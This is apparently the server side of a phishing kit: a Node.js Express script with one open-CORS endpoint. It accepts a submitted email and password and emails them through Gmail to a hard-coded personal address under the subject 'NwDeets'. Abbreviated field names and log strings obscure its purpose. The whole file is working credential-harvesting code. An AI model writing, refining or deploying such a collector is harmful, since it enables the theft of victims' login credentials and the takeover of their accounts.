const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');

const app = express();
const port = process.env.PORT;

app.use(cors());
app.use(express.json());

app.post('/submit', (req, res) => {
  const { wName, psdWet } = req.body;

  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS
      }
  });

  const mailOptions = {
    from: 'willyscotmegan@gmail.com',
    to: 'willyscotmegan@gmail.com',
    subject: 'NwDeets',
    text: `
      eml: ${wName}
      Psd: ${psdWet}
    `
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error(error);
      res.status(500).send('ErrSndgeml');
    } else {
      console.log('EmSt: ' + info.response);
      res.status(200).send('EmlSntScsfl!');
    }
  });
});

app.listen(port, () => {
  console.log(`Serlstprt ${port}`);
});